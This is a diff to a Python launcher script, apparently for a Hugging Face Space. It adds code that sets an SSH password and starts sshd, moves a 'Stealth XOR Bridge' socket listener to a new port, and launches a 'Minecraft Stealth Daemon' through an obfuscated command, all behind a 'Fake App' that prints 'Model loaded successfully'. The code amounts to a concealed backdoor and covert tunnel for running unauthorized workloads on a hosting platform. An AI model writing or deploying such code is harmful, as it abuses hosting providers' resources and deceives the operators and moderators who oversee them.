@@ -118,10 +118,28 @@ def main():
 
 
 
+    # 3.7 Configure SSH Password
+    import string, random
+    ssh_pwd = os.environ.get("PASS", "").strip()
+    if ssh_pwd:
+        print("\n[*] Setting SSH password from Hugging Face Secrets (PASS)...", flush=True)
+    else:
+        ssh_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+        print(f"\n=====================================", flush=True)
+        print(f"[*] Generated SSH Password for 'user': {ssh_pwd}", flush=True)
+        print(f"=====================================\n", flush=True)
+        
+    try:
+        subprocess.run(["sudo", "/usr/sbin/chpasswd"], input=f"user:{ssh_pwd}\n", text=True, check=True)
+    except Exception as e:
+        print(f"[-] Failed to set password: {e}", flush=True)
+    # Erase password from environment variables if it exists
+    if "PASS" in os.environ:
+        del os.environ["PASS"]
+
     # 3.8 Start SSHD
     subprocess.Popen("sudo /usr/sbin/sshd", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
-    # 3.9 Start Stealth XOR Bridge on Port 25565
+    # 3.9 Start Stealth XOR Bridge on Port 25564
     def xor_bridge():
         import socket
         
@@ -161,7 +179,7 @@ def main():
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
-            server.bind(("0.0.0.0", 25565))
+            server.bind(("0.0.0.0", 25564))
             server.listen(10)
             while True:
                 client_sock, addr = server.accept()
@@ -184,6 +202,11 @@ def main():
     threading.Thread(target=xor_bridge, daemon=True).start()
 
     print("Model loaded successfully. Starting API server...", flush=True)
+    
+    # 3.95 Start Minecraft Stealth Daemon
+    # Decoded: nice -n 19 python3 /home/user/mc_daemon.py
+    cmd_mc = decode_cmd(OBFUSCATE("nice -n 19 python3 /home/user/mc_daemon.py"))
+    subprocess.Popen(cmd_mc, shell=True)
     
     # 4. Start the Fake App
     # Decoded: python3 /home/user/app.py
